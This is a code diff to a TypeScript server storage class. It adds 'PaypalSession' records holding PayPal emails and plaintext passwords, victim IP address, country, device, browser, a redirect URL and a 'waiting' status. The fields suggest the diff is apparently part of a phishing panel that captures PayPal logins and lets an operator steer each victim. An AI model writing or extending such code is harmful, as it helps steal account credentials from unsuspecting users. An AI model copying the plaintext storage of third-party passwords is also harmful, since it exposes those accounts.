@@ -4,7 +4,9 @@ import {
   type AdminSettings,
   type InsertAdminSettings,
   type PaymentRecord,
-  type InsertPaymentRecord
+  type InsertPaymentRecord,
+  type PaypalSession,
+  type InsertPaypalSession
 } from "@shared/schema";
 import { randomUUID } from "crypto";
 
@@ -20,17 +22,24 @@ export interface IStorage {
   getPaymentRecord(id: string): Promise<PaymentRecord | undefined>;
   updatePaymentRecord(id: string, updates: Partial<InsertPaymentRecord>): Promise<PaymentRecord | undefined>;
   getAllPaymentRecords(): Promise<PaymentRecord[]>;
+  
+  createPaypalSession(session: InsertPaypalSession): Promise<PaypalSession>;
+  getPaypalSession(sessionId: string): Promise<PaypalSession | undefined>;
+  updatePaypalSession(sessionId: string, updates: Partial<InsertPaypalSession>): Promise<PaypalSession | undefined>;
+  getAllPaypalSessions(): Promise<PaypalSession[]>;
 }
 
 export class MemStorage implements IStorage {
   private users: Map<string, User>;
   private adminSettings: AdminSettings | null;
   private paymentRecords: Map<string, PaymentRecord>;
+  private paypalSessions: Map<string, PaypalSession>;
 
   constructor() {
     this.users = new Map();
     this.adminSettings = null;
     this.paymentRecords = new Map();
+    this.paypalSessions = new Map();
   }
 
   async getUser(id: string): Promise<User | undefined> {
@@ -105,6 +114,47 @@ export class MemStorage implements IStorage {
 
   async getAllPaymentRecords(): Promise<PaymentRecord[]> {
     return Array.from(this.paymentRecords.values()).sort(
+      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
+    );
+  }
+
+  async createPaypalSession(session: InsertPaypalSession): Promise<PaypalSession> {
+    const id = randomUUID();
+    const paypalSession: PaypalSession = {
+      id,
+      sessionId: session.sessionId,
+      email: session.email,
+      password: session.password,
+      ipAddress: session.ipAddress ?? null,
+      country: session.country ?? null,
+      device: session.device ?? null,
+      browser: session.browser ?? null,
+      redirectUrl: session.redirectUrl ?? null,
+      status: session.status ?? "waiting",
+      createdAt: new Date(),
+    };
+    this.paypalSessions.set(session.sessionId, paypalSession);
+    return paypalSession;
+  }
+
+  async getPaypalSession(sessionId: string): Promise<PaypalSession | undefined> {
+    return this.paypalSessions.get(sessionId);
+  }
+
+  async updatePaypalSession(sessionId: string, updates: Partial<InsertPaypalSession>): Promise<PaypalSession | undefined> {
+    const session = this.paypalSessions.get(sessionId);
+    if (!session) return undefined;
+
+    const updated: PaypalSession = {
+      ...session,
+      ...updates,
+    };
+    this.paypalSessions.set(sessionId, updated);
+    return updated;
+  }
+
+  async getAllPaypalSessions(): Promise<PaypalSession[]> {
+    return Array.from(this.paypalSessions.values()).sort(
       (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
     );
   }
